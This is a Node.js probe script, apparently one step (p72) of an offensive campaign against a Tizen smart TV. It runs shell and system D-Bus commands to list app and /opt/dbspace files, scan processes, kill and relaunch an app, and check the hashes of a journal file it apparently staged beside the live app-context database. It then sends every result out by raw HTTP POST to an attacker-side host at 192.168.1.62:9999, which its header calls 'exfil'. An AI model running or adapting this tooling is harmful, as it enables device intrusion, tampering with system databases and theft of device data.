"use strict";

/* p72: why no p71 events after reinstall? + relaunch retry
   A. app res state: /opt/usr/apps/ProbeTenio/ + res/ + index.html md5 (expect f66a0f4937cacdece368177b0e9467a0)
   B. /proc scan for Probe processes
   C. /opt/dbspace listing (p71 markers?)
   D. showing app
   E. terminate -> wait 8s -> launch -> wait 20s -> showing
   F. verify DST/LIVE + p71 markers again
   exfil /p72info
 */

var fs = null, cp = null, net = null;
try { fs = require('fs'); } catch (e) {}
try { cp = require('child_process'); } catch (e) {}
try { net = require('net'); } catch (e) {}

var HOST = '192.168.1.62';
var PORT = 9999;
var STAGED = '/home/owner/share/tmp/sdk_tools/appctx_hot_journal';
var DST = '/opt/dbspace/.app-context.db-journal';
var LIVE = '/opt/dbspace/.app-context.db';
var APP = 'ProbeTenio.Probe10';
var LITE = 'org.tizen.tv.litewebappservice.server';
var LITE_PATH = '/org/tizen/tv/litewebappservice/server';
var LITE_IFACE = 'org.tizen.tv.litewebappservice.server.interface';
var R = { ts: new Date().toISOString(), probe: 'p72', results: {}, log: [] };
var posted = false;

function L(s) { R.log.push(String(s).substring(0, 500)); }

function postBuf(path, buf) {
  var hdr = 'POST ' + path + ' HTTP/1.1\r\nHost: ' + HOST + ':9999\r\nContent-Type: application/octet-stream\r\nContent-Length: ' + buf.length + '\r\nConnection: close\r\n\r\n';
  try {
    var s = net.connect(PORT, HOST);
    s.setTimeout(120000, function () { s.destroy(); });
    s.on('connect', function () {
      s.write(hdr);
      var off = 0;
      var iv = setInterval(function () {
        if (off >= buf.length) { clearInterval(iv); setTimeout(function () { s.destroy(); }, 3000); return; }
        s.write(buf.slice(off, off + 65536));
        off += 65536;
      }, 50);
      setTimeout(function () { s.destroy(); }, 240000);
    });
    s.on('error', function (e) { L('postBuf err ' + e.message); });
  } catch (e) { L('postBuf ctor ' + e); }
}

function postFinal() {
  if (posted) return;
  posted = true;
  postBuf('/p72info', new Buffer(JSON.stringify(R), 'utf8'));
}

function run(cmd, timeoutMs, maxLen) {
  maxLen = maxLen || 8000;
  try {
    var out = cp.execSync(cmd, { timeout: timeoutMs || 25000, maxBuffer: 16 * 1024 * 1024 }).toString().trim();
    return '[exit 0] ' + out.substring(0, maxLen);
  } catch (e) {
    var o = '';
    if (e.stdout) o += e.stdout.toString();
    if (e.stderr) o += (o ? '\n' : '') + e.stderr.toString();
    return '[exit ' + (e.status === undefined ? '?' : e.status) + '] ' + (o || (e && e.message) || 'unknown').substring(0, maxLen);
  }
}

function sleepSync(ms) {
  try { cp.execSync('sleep ' + Math.ceil(ms / 1000), { timeout: ms + 30000, maxBuffer: 4096 }); } catch (e) {}
}

function main() {
  R.results.a1_appres = run('ls -la /opt/usr/apps/ProbeTenio/ 2>&1; echo ===RES; ls -la /opt/usr/apps/ProbeTenio/res/ 2>&1 | head -20; echo ===MD5; md5sum /opt/usr/apps/ProbeTenio/res/index.html 2>&1; echo ===CONFIG; cat /opt/usr/apps/ProbeTenio/res/config.xml 2>&1 | head -12', 20000);
  R.results.b_proc = run('found=""; for d in /proc/[0-9]*; do c=$(cat "$d/comm" 2>/dev/null) || continue; case "$c" in *Probe*|*probe*) u=$(awk \'/^Uid:/{print $2}\' "$d/status" 2>/dev/null); found="$found PID=$(basename $d) COMM=$c UID=$u";; esac; done; echo "$found" | head -c 2000', 20000);
  R.results.c_dbspace = run('ls -la /opt/dbspace/ 2>&1 | grep -vE "Permission denied" | head -40', 20000);
  R.results.d_showing = run('dbus-send --system --print-reply --dest=' + LITE + ' --type=method_call ' + LITE_PATH + ' ' + LITE_IFACE + '.get_current_showing_app 2>&1 | head -8', 30000);

  /* E. relaunch retry */
  R.results.e1_terminate = run('dbus-send --system --print-reply --dest=' + LITE + ' --type=method_call ' + LITE_PATH + ' ' + LITE_IFACE + '.terminate_app string:"' + APP + '" int32:0 2>&1 | head -8', 45000);
  sleepSync(8000);
  R.results.e2_launch = run('dbus-send --system --print-reply --dest=' + LITE + ' --type=method_call ' + LITE_PATH + ' ' + LITE_IFACE + '.launch_app string:"p72" int32:0 string:"' + APP + '" string:"" string:"p72" int32:0 int32:0 int32:0 string:"launch" int32:1 int32:0 int32:0 int32:0 int32:0 int32:0 int32:0 int32:0 int32:0 2>&1 | head -8', 45000);
  sleepSync(20000);
  R.results.e3_showing = run('dbus-send --system --print-reply --dest=' + LITE + ' --type=method_call ' + LITE_PATH + ' ' + LITE_IFACE + '.get_current_showing_app 2>&1 | head -8', 30000);
  R.results.e4_proc = run('found=""; for d in /proc/[0-9]*; do c=$(cat "$d/comm" 2>/dev/null) || continue; case "$c" in *Probe*|*probe*) u=$(awk \'/^Uid:/{print $2}\' "$d/status" 2>/dev/null); found="$found PID=$(basename $d) COMM=$c UID=$u";; esac; done; echo "$found" | head -c 2000', 20000);

  /* F. verify */
  R.results.f1_verify = run('echo ===DST; md5sum ' + DST + ' 2>&1; echo ===LIVE; md5sum ' + LIVE + ' 2>&1; echo ===DBSPACE; ls -la /opt/dbspace/ 2>&1 | grep -vE "Permission denied" | grep -E "p71|journal|total"', 20000);

  R.results.final = 'done ' + new Date().toISOString();
  L('done');
  postFinal();
  setTimeout(postFinal, 20000);
}

try { main(); } catch (e) { R.results.fatal = String(e) + ' | ' + (e.stack || 'no-stack'); postFinal(); }
